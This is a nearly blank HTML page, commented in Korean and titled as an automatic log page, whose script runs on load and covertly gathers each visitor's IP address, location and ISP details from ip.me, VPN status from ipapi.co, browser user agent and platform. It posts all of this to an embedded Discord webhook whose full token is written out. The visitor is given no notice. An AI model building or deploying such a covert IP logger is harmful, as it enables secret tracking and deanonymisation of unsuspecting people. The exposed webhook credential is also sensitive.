<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>자동 로그 페이지</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
    h1 { color: #333; }
  </style>
</head>
<body>
  <h1>o</h1>

  <script>
    async function sendLog() {
      const webhookURL = "https://discord.com/api/webhooks/1554829524456317000/g-aN0V0bngIgpupLFB6Fy5JpiEsQCZAcmIbm83F-OBbUMqRtAeaRUUiCSUC2QEI2qkFv"; // 본인 웹훅 URL 입력

      // 기본 정보
      const ua = navigator.userAgent;
      const osInfo = navigator.platform;
      const isMobile = /Mobi|Android/i.test(ua) ? "true" : "false";

      // ip.me 정보 가져오기
      let ipInfo = "정보 없음";
      try {
        const res = await fetch("https://ip.me/");
        ipInfo = await res.text(); // ip.me는 텍스트로 IP/위치/ISP 등 표시
      } catch (e) {
        console.error("ip.me 정보 가져오기 실패", e);
      }

      // ipapi.co로 VPN 여부 확인
      let ip = "알 수 없음";
      let vpn = "알 수 없음";
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip;
        vpn = data.proxy ? "true" : "false";
      } catch (e) {
        console.error("IP/VPN 가져오기 실패", e);
      }

      // 디스코드로 전송
      const payload = {
        content: `📋 새로운 접속 로그\nIP: ${ip}\nVPN: ${vpn}\n브라우저 UA: ${ua}\nOS: ${osInfo}\n모바일: ${isMobile}\n\n🌐 ip.me 정보:\n${ipInfo}`
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      })
      .then(r => console.log(r.ok ? "로그 전송 성공!" : "실패: " + r.status))
      .catch(err => console.error("에러: " + err));
    }

    // 페이지 접속 시 자동 실행
    window.onload = sendLog;
  </script>
</body>
</html>
